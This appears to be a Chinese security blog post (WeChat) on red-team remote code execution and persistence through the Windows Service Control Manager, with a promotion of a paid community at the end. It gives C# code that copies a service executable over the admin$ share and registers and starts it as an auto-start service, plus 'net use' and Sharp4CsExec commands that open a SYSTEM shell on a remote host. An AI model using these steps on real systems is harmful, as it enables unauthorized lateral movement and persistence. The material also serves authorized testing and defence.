---
title: .NET | SCM权限维持在红队实战中的应用
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497966&idx=3&sn=7ec2283839c68d00a1acbaf562812acc&chksm=fa595603cd2edf156bebe4c749534e8b07888c8b0556188af4f3d1150bcaedf34260e21b9311&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-05
fetch_date: 2025-10-06T20:08:34.124345
---

# .NET | SCM权限维持在红队实战中的应用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaTwaucuw3MvRHAImJs5jM7bs83l6CVzInU3K4llet00D36l5RILspjw/0?wx_fmt=jpeg)

# .NET | SCM权限维持在红队实战中的应用

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

红队实战技术SCM

在红队渗透测试或模拟攻击中，利用 Windows 服务控制管理器进行远程代码执行是一种高效且隐蔽的方式。本文将通过代码解析的形式，详细介绍如何通过调用 SCM 的相关接口实现恶意服务的创建与启动，探讨这种方法的技术细节及应用场景。

## 2.1 函数介绍

服务控制管理器是 Windows 操作系统的核心组件，负责管理系统中的所有服务，包括创建、启动、停止和删除服务等操作。利用服务控制管理器的功能，攻击者可以在目标主机上注册恶意服务并将其作为持久化机制或远程代码执行入口。主要用到的两个 API 函数是：

```
```
OpenSCManager：打开服务控制管理器，获取管理服务的权限。
CreateService：在服务控制管理器中注册新的服务。
```
```

其中，OpenSCManager 用于打开指定主机的服务控制管理器，函数签名如下所示。

```
```
[DllImport("advapi32.dll")]
public static extern ServiceControlHandle OpenSCManager(
    string lpMachineName,
    string lpSCDB,
    NativeMethods.SCM_ACCESS scParameter
);
```
```

这里lpMachineName：目标计算机的名称，通常表示本地计算机。scParameter参数，表示服务控制管理器的访问权限，例如 SC\_MANAGER\_CREATE\_SERVICE 用于允许创建服务。

另外，CreateService 用于创建新的服务，通常成功时返回服务句柄，失败时返回无效句柄。签名代码如下所示。

```
```
[DllImport("Advapi32.dll")]
public static extern ServiceControlHandle CreateService(
    ServiceControlHandle serviceControlManagerHandle,
    string lpSvcName,
    string lpDisplayName,
    NativeMethods.SERVICE_ACCESS dwDesiredAccess,
    NativeMethods.SERVICE_TYPES dwServiceType,
    NativeMethods.SERVICE_START_TYPES dwStartType,
    NativeMethods.SERVICE_ERROR_CONTROL dwErrorControl,
    string lpPathName,
    string lpLoadOrderGroup,
    IntPtr lpdwTagId,
    string lpDependencies,
    string lpServiceStartName,
    string lpPassword
);
```
```

dwDesiredAccess：服务访问权限，如 SERVICE\_ALL\_ACCESS 表示完全权限。dwServiceType：服务类型，例如 SERVICE\_WIN32\_OWN\_PROCESS 表示独立进程服务。dwStartType 表示如 SERVICE\_AUTO\_START 表示自动启动。

## 2.2 红队思路解析

红队选手可以根据目标主机的 .NET 版本，将合适的恶意服务可执行文件上传到目标主机的系统目录下，这里利用目标主机的 admin$ 共享路径，将恶意服务文件上传至 system32 目录。需要确保对目标主机具有管理员权限，具体代码如下所示。

```
```
string path = hostname + "\\admin$\\system32\\svc.exe";
File.WriteAllBytes(path, svcexe);
Console.WriteLine("[*] Copied {0} service executable to {1}", version, hostname);
```
```

随后，使用 OpenSCManager 获取目标主机的 SCM 句柄，为后续的服务创建操作做准备，具体代码如下所示。

```
```
using (ServiceControlHandle scmHandle = NativeMethods.OpenSCManager(hostname, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
{
    if (scmHandle.IsInvalid)
    {
        throw new Win32Exception("无法打开服务控制管理器！");
    }
}
```
```

再使用 CreateService 方法将上传的可执行文件注册为系统服务，配置服务的名称、启动类型等参数，最后注册完成后，通过服务句柄启动服务，执行恶意代码。

```
```
using (ServiceControlHandle serviceHandle = NativeMethods.CreateService(
    scmHandle,
    "svc",
    "CS Service",
    NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
    NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
    NativeMethods.SERVICE_START_TYPES.SERVICE_AUTO_START,
    NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_NORMAL,
    "csexecsvc.exe", null, IntPtr.Zero, null, null, null))
{
    if (serviceHandle.IsInvalid)
    {
        throw new Win32Exception("创建服务失败！");
    }
    Console.WriteLine("[*] 服务创建成功！");
}
NativeMethods.StartService(serviceHandle, 0, null);
Console.WriteLine("[*] 服务已启动！");
```
```

03

工具实现

**Sharp4CsExec.exe** 是一个基于 .NET 实现的工具，通过调用 Windows 服务控制管理器相关 API，可以在远程目标主机上创建恶意服务并启动指定的可执行文件（如 cmd.exe），实现远程命令执行功能。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaMm5xwfMZne5zVsm9Zx7M2kr0wUVmLwoxnDNeayq5VQPhlWk9HBVyLQ/640?wx_fmt=jpeg&from=appmsg)

在使用 **Sharp4CsExec.exe** 之前，必须确保已成功连接目标主机的共享路径。通过以下命令可以建立共享连接：

```
```
net use \\192.168.101.86\admin$ /user:"ivan1ee" "123456"
```
```

该命令成功后，将在本地与目标主机建立共享连接，允许通过 admin$ 路径上传文件或操作目标文件系统。

接着，连接成功后，可使用 **Sharp4CsExec.exe** 在目标主机上启动 cmd.exe，获取一个交互式的远程 Shell。命令如下所示。

```
```
Sharp4CsExec.exe \\192.168.101.86 cmd.exe
```
```

运行上述命令后，工具将在目标主机上注册一个临时服务以启动 cmd.exe。服务启动后，工具会捕获目标主机返回的输出，通常以 nt authority\system 权限运行。

综上，通过服务控制管理器 API，红队可以高效地在目标主机上创建并启动恶意服务，实现远程代码执行和权限维持。文章涉及的工具已经打包在星球，感兴趣的师傅们可以加入自取。

04

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8A7Qhn1ssuqNzv0iceS7ZhOuZ0AO4P1eFeG2xTdR2V6GWibiaxO2RenUJzrwOfvsdqofibI6H2uY0CLQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497429&idx=2&sn=a07599921eeb651ce005f57ed350be5e&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497498&idx=2&sn=00900a0c29c85b41fe6a586d7e5c3571&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

05

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。 星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、...